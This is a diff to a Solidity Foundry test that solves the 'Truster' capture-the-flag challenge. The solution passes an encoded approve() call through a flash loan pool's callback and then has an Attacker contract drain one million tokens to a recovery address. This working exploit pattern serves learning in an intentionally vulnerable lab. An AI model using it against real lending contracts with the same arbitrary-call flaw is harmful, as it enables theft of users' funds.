@@ -51,14 +51,17 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        Attacker attacker = new Attacker();
+        Attacker attacker = new Attacker(token, pool);
         
         uint256 amountToApprove = 1_000_000 * 10**18;
         address attackerAddress = address(attacker);
         bytes memory data = abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), attackerAddress, amountToApprove);
         
         pool.flashLoan(0, msg.sender, address(token), data);
-        attack.withdrawAndSend();
+        attacker.withdrawAndSend();
+
+        emit log_named_decimal_uint("Pool token balance after attack:", token.balanceOf(address(pool)), 18);
+        emit log_named_decimal_uint("recovery token balance after attack:", token.balanceOf(recovery), 18);
     }
 
     /**
@@ -74,7 +77,16 @@ contract TrusterChallenge is Test {
     }
 }
 
-contract Attacker {
+contract Attacker is Test{
+    DamnValuableToken token;
+    TrusterLenderPool pool;
+    address recovery = makeAddr("recovery");
+
+    constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
+        token = _token;
+        pool = _pool;
+    }
+
     function withdrawAndSend() public {
         token.transferFrom(address(pool), recovery, 1_000_000 * 10**18);
     }
